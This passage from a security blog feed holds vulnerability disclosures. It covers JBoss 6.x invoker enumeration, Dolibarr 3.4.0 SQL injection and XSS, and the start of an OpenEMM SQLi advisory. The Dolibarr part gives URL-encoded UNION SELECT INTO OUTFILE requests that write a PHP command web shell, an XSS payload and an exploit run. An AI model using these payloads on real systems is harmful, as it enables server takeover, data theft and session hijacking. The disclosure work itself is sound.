</pre></td><td class='code'><pre><code class=''><span class='line'>public static Map&lt;Object, Object&gt; entries = new ConcurrentHashMap&lt;Object, Object&gt;();</span></code></pre></td></tr></table></div></figure>


<p>To further enumerate this, we can iterate over the class methods and pull all of their hashes and hash codes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;%@ page import="java.io.*"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Map"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Iterator"%&gt;
</span><span class='line'>&lt;%@ page import="java.lang.reflect.Method"%&gt;
</span><span class='line'>&lt;%@ page import="org.jboss.system.Registry"%&gt;
</span><span class='line'>&lt;%@ page import="javax.management.ObjectName"%&gt;
</span><span class='line'>&lt;%@ page import="org.jboss.invocation.MarshalledInvocation"%&gt;
</span><span class='line'>&lt;%
</span><span class='line'>    Iterator it = Registry.entries.entrySet().iterator();
</span><span class='line'>    while (it.hasNext()){
</span><span class='line'>        Map.Entry pairs = (Map.Entry)it.next();
</span><span class='line'>        out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
</span><span class='line'>
</span><span class='line'>        // check for ObjectName
</span><span class='line'>        if (pairs.getKey() instanceof ObjectName){
</span><span class='line'>            Long hash;
</span><span class='line'>            Method[] methods = pairs.getValue().getClass().getMethods();
</span><span class='line'>            for (int m = 0; m &lt; methods.length; ++m){
</span><span class='line'>                Method method = methods[m];
</span><span class='line'>                hash = new Long(MarshalledInvocation.calculateHash(method));
</span><span class='line'>                out.println("Method: " + method + "  Hash: " + hash + " (" + method.hashCode() + ")" + "&lt;br/&gt;");
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        out.println("Key class: " + pairs.getKey().getClass() + "&lt;br/&gt;");
</span><span class='line'>        it.remove();
</span><span class='line'>    }
</span><span class='line'>%&gt;</span></code></pre></td></tr></table></div></figure>


<p>Which gives us:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_6x_methods.jpg"></p>

<p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>

<p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dolibarr 3.4.0 - Multiple Vulnerabilities]]></title>
    <link href="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/"/>
    <updated>2013-10-14T23:13:15-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities</id>
    <content type="html"><![CDATA[<p><a href="http://www.dolibarr.org/">Dolibarr</a> is an open source, enterprise-grade ERP/CRM application developed in PHP.  The latest stable release, 3.4.0, is vulnerable to a host of remotely exploitable post and pre auth vulnerabilities, along with several seriously mind-bending security/architecture choices.  These vulnerabilities and issues were privately disclosed to the vendor, and the SQLi was patched in version 3.4.1.  However, their sanitization methods were not fixed, and no mention was made on a future patch.  Other SQLi vectors are likely.</p>

<p>There are multiple SQL injections that lead to a compromise of the availability/integrity of the database or web server.  The scenario and context of the vulnerabilities are rather interesting, as multiple blacklisting techniques are used by Dolibarr in an attempt to mitigate malicious queries slipping through; nevertheless, as we know, blacklisting never works.  No parameterized queries are to be found in source.</p>

<p>The following is included in each page and used for &ldquo;sanitization&rdquo; <code>main.inc.php</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function analyse_sql_and_script(&$var, $type)
</span><span class='line'>{
</span><span class='line'>    if (is_array($var))
</span><span class='line'>    {
</span><span class='line'>        foreach ($var as $key =&gt; $value)
</span><span class='line'>        {
</span><span class='line'>            if (analyse_sql_and_script($value,$type))
</span><span class='line'>            {
</span><span class='line'>                $var[$key] = $value;
</span><span class='line'>            }
</span><span class='line'>            else
</span><span class='line'>            {
</span><span class='line'>                print 'Access refused by SQL/Script injection protection in main.inc.php';
</span><span class='line'>                exit;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>        return true;
</span><span class='line'>    }
</span><span class='line'>    else
</span><span class='line'>    {
</span><span class='line'>        return (test_sql_and_script_inject($var,$type) &lt;= 0);
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Pretty typical recursive function for sanitizing input.  The following performs the actual sanity checking:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function test_sql_and_script_inject($val, $type)
</span><span class='line'>{
</span><span class='line'>    $sql_inj = 0;
</span><span class='line'>    // For SQL Injection (only GET and POST are used to be included into bad escaped SQL requests)
</span><span class='line'>    if ($type != 2)
</span><span class='line'>    {
</span><span class='line'>        $sql_inj += preg_match('/delete[\s]+from/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/create[\s]+table/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/update.+set.+=/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/insert[\s]+into/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/select.+from/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/union.+select/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/(\.\.%2f)+/i', $val);
</span><span class='line'>    }
</span><span class='line'>    // For XSS Injection done by adding javascript with script
</span><span class='line'>    // This is all cases a browser consider text is javascript:
</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
</span><span class='line'>    if ($type == 1)
</span><span class='line'>    {
</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
</span><span class='line'>    }
</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
</span><span class='line'>    return $sql_inj;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s quite clear that the blacklisting approach is inefficient; particularly the cross-site scripting protection.  The SQLi blacklisting doesn&rsquo;t restrict INTO OUTFILE/DUMPFILE, meaning with a well-tuned SQL injection we can throw a web shell onto the box.</p>

<p>Let&rsquo;s take a look at one such vulnerable query <code>contact/fiche.php</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ($action == 'confirm_delete' && $confirm == 'yes' && $user-&gt;rights-&gt;societe-&gt;contact-&gt;supprimer)
</span><span class='line'>    {
</span><span class='line'>        $result=$object-&gt;fetch($_GET["id"]);</span></code></pre></td></tr></table></div></figure>


<p><code>contact/class/contact.class.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id, $user=0)
</span><span class='line'>    {
</span><span class='line'>        global $langs;
</span><span class='line'>
</span><span class='line'>        $langs-&gt;load("companies");
</span><span class='line'>
</span><span class='line'>        $sql = "SELECT c.rowid, c.fk_soc, c.civilite as civilite_id, c.lastname, c.firstname,";
</span><span class='line'>        $sql.= " c.address, c.zip, c.town,";
</span><span class='line'>        $sql.= " c.fk_pays as country_id,";
</span><span class='line'>        $sql.= " c.fk_departement,";
</span><span class='line'>        $sql.= " c.birthday,";
</span><span class='line'>        $sql.= " c.poste, c.phone, c.phone_perso, c.phone_mobile, c.fax, c.email, c.jabberid,";
</span><span class='line'>        $sql.= " c.priv, c.note_private, c.note_public, c.default_lang, c.no_email, c.canvas,";
</span><span class='line'>        $sql.= " c.import_key,";
</span><span class='line'>        $sql.= " p.libelle as country, p.code as country_code,";
</span><span class='line'>        $sql.= " d.nom as state, d.code_departement as state_code,";
</span><span class='line'>        $sql.= " u.rowid as user_id, u.login as user_login,";
</span><span class='line'>        $sql.= " s.nom as socname, s.address as socaddress, s.zip as soccp, s.town as soccity, s.default_lang as socdefault_lang";
</span><span class='line'>        $sql.= " FROM ".MAIN_DB_PREFIX."socpeople as c";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_pays as p ON c.fk_pays = p.rowid";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_departements as d ON c.fk_departement = d.rowid";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."user as u ON c.rowid = u.fk_socpeople";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."societe as s ON c.fk_soc = s.rowid";
</span><span class='line'>        $sql.= " WHERE c.rowid = ". $id;
</span><span class='line'>
</span><span class='line'>        dol_syslog(get_class($this)."::fetch sql=".$sql);
</span><span class='line'>        $resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>


<p>Our vulnerable parameter <code>id</code> is sanitized only by the previously described functions.  There are now two main options; dump information from the database, or drop a web shell onto the host.  The latter is the best case and the former is, usually, a good consolatory prize.  However, in this case, the database is ripe with information, specifically:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG"></p>

<p>Yeah, that&rsquo;s your plaintext password stored right next to the hashed version.  Dumping the database just got a whole lot more interesting.</p>

<p>Our attention now turns to evading the filters listed above.  For obtaining a shell, the only evasion we need to consider is UNION SELECT, as INTO OUTFILE/DUMPFILE is not filtered.  After a bit of deliberation and source code analysis, it was determined that the filters were trivially bypassed by URL encoding SQL keywords.  The following query will drop a web shell at the given location:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/dolibarr-3.4.0/htdocs/contact/fiche.php?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php'&action=confirm_delete&confirm=yes HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Which results in:</p>

<p><img class="center" src="http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG" title="" ></p>

<p>The documents folder is a perfect candidate for our web shell as, during installation of the CMS, this folder must be user-created and writable by the install, giving us a guaranteed and predictable location for the web shell.</p>

<p>This vulnerability has been detected in <code>contact.class.php</code> in four different functions: fetch, update, delete, and create.</p>

<p>We now take another look at the XSS filtering function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  // For XSS Injection done by adding javascript with script
</span><span class='line'>    // This is all cases a browser consider text is javascript:
</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
</span><span class='line'>    if ($type == 1)
</span><span class='line'>    {
</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
</span><span class='line'>    }
</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
</span><span class='line'>    return $sql_inj;</span></code></pre></td></tr></table></div></figure>


<p>As we can see, this is quite weak, and we can get by with a very simple injection, <code>&lt;body onload=alert(1)&gt;</code>.  Injecting this into the last name of a contact results in success:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG"></p>

<p>With this we can syphon off session IDs and completely hijack sessions.  Any field that&rsquo;s reflected back to the user is vulnerable, and considering this is a CMS, that&rsquo;s a lot.</p>

<p>All of the discussed vulnerabilities have, thus far, been post-auth.  One remotely exploitable pre-auth vulnerability was discovered in <code>public/members/public_list.php</code> (configured with <code>define("NOLOGIN",1)</code>), meaning it does not require auth):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$sortfield = GETPOST("sortfield",'alpha');
</span><span class='line'>$sortorder = GETPOST("sortorder",'alpha');
</span><span class='line'>$page = GETPOST("page",'int');
</span><span class='line'>if ($page == -1) { $page = 0; }
</span><span class='line'>$offset = $conf-&gt;liste_limit * $page;
</span><span class='line'>$pageprev = $page - 1;
</span><span class='line'>$pagenext = $page + 1;
</span><span class='line'>
</span><span class='line'>$filter=GETPOST('filter');
</span><span class='line'>$statut=GETPOST('statut');
</span><span class='line'>
</span><span class='line'>if (! $sortorder) {  $sortorder="ASC"; }
</span><span class='line'>if (! $sortfield) {  $sortfield="nom"; }
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>/*
</span><span class='line'> * View
</span><span class='line'> */
</span><span class='line'>
</span><span class='line'>llxHeaderVierge($langs-&gt;trans("ListOfValidatedPublicMembers"));
</span><span class='line'>
</span><span class='line'>$sql = "SELECT rowid, firstname, lastname, societe, zip, town, email, birth, photo";
</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."adherent";
</span><span class='line'>$sql.= " WHERE entity = ".$entity;
</span><span class='line'>$sql.= " AND statut = 1";
</span><span class='line'>$sql.= " AND public = 1";
</span><span class='line'>$sql.= $db-&gt;order($sortfield,$sortorder);
</span><span class='line'>$sql.= $db-&gt;plimit($conf-&gt;liste_limit+1, $offset);</span></code></pre></td></tr></table></div></figure>


<p>And <code>core/db/msqli.class.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> function order($sortfield=0,$sortorder=0)
</span><span class='line'>    {
</span><span class='line'>        if ($sortfield)
</span><span class='line'>        {
</span><span class='line'>            $return='';
</span><span class='line'>            $fields=explode(',',$sortfield);
</span><span class='line'>            foreach($fields as $val)
</span><span class='line'>            {
</span><span class='line'>                if (! $return) $return.=' ORDER BY ';
</span><span class='line'>                else $return.=',';
</span><span class='line'>
</span><span class='line'>                $return.=preg_replace('/[^0-9a-z_\.]/i','',$val);
</span><span class='line'>                if ($sortorder) $return.=' '.preg_replace('/[^0-9a-z]/i','',$sortorder);
</span><span class='line'>            }
</span><span class='line'>            return $return;
</span><span class='line'>        }
</span><span class='line'>        else
</span><span class='line'>        {
</span><span class='line'>            return '';
</span><span class='line'>        }
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>And navigation to the page results in:</p>

<p><img class="center" src="http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG"></p>

<p>As shown, the <code>sortfield</code> and <code>sortorder</code> parameters are inadequately sanitized, but exploitation may be a bit tricky.  The order function strips everything that isn&rsquo;t a number, lowercase alphanumeric letter, or one of three symbols.  Instead, why don&rsquo;t we exploit yet <em>another</em> preauth vulnerability in <code>opensurvey/public/exportcsv.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$action=GETPOST('action');
</span><span class='line'>$numsondage = $numsondageadmin = '';
</span><span class='line'>
</span><span class='line'>if (GETPOST('sondage'))
</span><span class='line'>{
</span><span class='line'>    if (strlen(GETPOST('sondage')) == 24)    // recuperation du numero de sondage admin (24 car.) dans l'URL
</span><span class='line'>    {
</span><span class='line'>        $numsondageadmin=GETPOST("sondage",'alpha');
</span><span class='line'>        $numsondage=substr($numsondageadmin, 0, 16);
</span><span class='line'>    }
</span><span class='line'>    else
</span><span class='line'>    {
</span><span class='line'>        $numsondageadmin='';
</span><span class='line'>        $numsondage=GETPOST("sondage",'alpha');
</span><span class='line'>    }
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$object=new Opensurveysondage($db);
</span><span class='line'>$result=$object-&gt;fetch(0,$numsondage);
</span><span class='line'>if ($result &lt;= 0) dol_print_error('','Failed to get survey id '.$numsondage);</span></code></pre></td></tr></table></div></figure>


<p>And <code>opensurvey/class/opensurveysondage.class.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id,$numsurvey='')
</span><span class='line'>{
</span><span class='line'>global $langs;
</span><span class='line'>
</span><span class='line'>$sql = "SELECT";
</span><span class='line'>//$sql.= " t.rowid,";
</span><span class='line'>$sql.= " t.id_sondage,";
</span><span class='line'>$sql.= " t.commentaires,";
</span><span class='line'>$sql.= " t.mail_admin,";
</span><span class='line'>$sql.= " t.nom_admin,";
</span><span class='line'>$sql.= " t.titre,";
</span><span class='line'>$sql.= " t.id_sondage_admin,";
</span><span class='line'>$sql.= " t.date_fin,";
</span><span class='line'>$sql.= " t.format,";
</span><span class='line'>$sql.= " t.mailsonde,";
</span><span class='line'>$sql.= " t.survey_link_visible,";
</span><span class='line'>$sql.= " t.canedit,";
</span><span class='line'>$sql.= " t.sujet,";
</span><span class='line'>$sql.= " t.tms";
</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."opensurvey_sondage as t";
</span><span class='line'>if ($id &gt; 0) $sql.= " WHERE t.rowid = ".$id;
</span><span class='line'>else if (strlen($numsurvey) == 16) $sql.= " WHERE t.id_sondage = '".$numsurvey."'";
</span><span class='line'>else $sql.= " WHERE t.id_sondage_admin = '".$numsurvey."'";
</span><span class='line'>
</span><span class='line'>dol_syslog(get_class($this)."::fetch sql=".$sql, LOG_DEBUG);
</span><span class='line'>$resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>


<p>As the bolded path shows, the query argument <code>numsurvey</code> is directly controllable by an unauthenticated user, leading to the same type of SQL vulnerability shown earlier.  This can be exploited with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /dolibarr/htdocs/opensurvey/public/exportcsv.php?sondage='%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php';%20--%20-%20 HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Using the same URL encoding trick from before, we can bypass the blacklisting and inject directly into the vulnerable query.  Exploit code for this is included at the bottom of the post:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python dolibarr_34_sploit.py -i 192.168.1.100 -p /dolibarr-3.4.0 -w /var/www/dolibarr-3.4.0/documents
</span><span class='line'>[!] Dropping web shell on 192.168.1.100...
</span><span class='line'>[!] Shell dropped.  http://192.168.1.100/documents/o4oct.php?cmd=ls
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG"></p>

<p>Fortunately, for users running DoliWamp,  Dolibarr + WAMP package on Windows, the default user that the database runs with is not allowed to write files.  They are still vulnerable, however, to database corruption and traversal (i.e. drop table subqueries, etc.).</p>

<h3>Timeline</h3>


<ul>
<li>10/06/2013 &ndash; Vendor notified of remotely exploitable vulnerabilities</li>
<li>10/07/2013 &ndash; Vendor acknowledges vulnerability, no timeline provided</li>
<li>10/11/2013 &ndash; Vendor states fix will be in the 3.4.1 release within the month</li>
<li>10/14/2013 &ndash; 3.4.1 released with patch.  This advisory released</li>
</ul>


<p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
    <updated>2013-07-28T23:24:15-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>

<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  /**
</span><span class='line'>     * Gets the SQL string.
</span><span class='line'>     */
</span><span class='line'>    public static String getSQLSafeString(String input) {
</span><span class='line'>        if (input == null) {
</span><span class='line'>            return " ";
</span><span class='line'>        } else {
</span><span class='line'>            return input.replace("'", "''");
</span><span class='line'>        }
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>\' AND UNION SELECT 1,2,3;-- </span></code></pre></td></tr></table></div></figure>


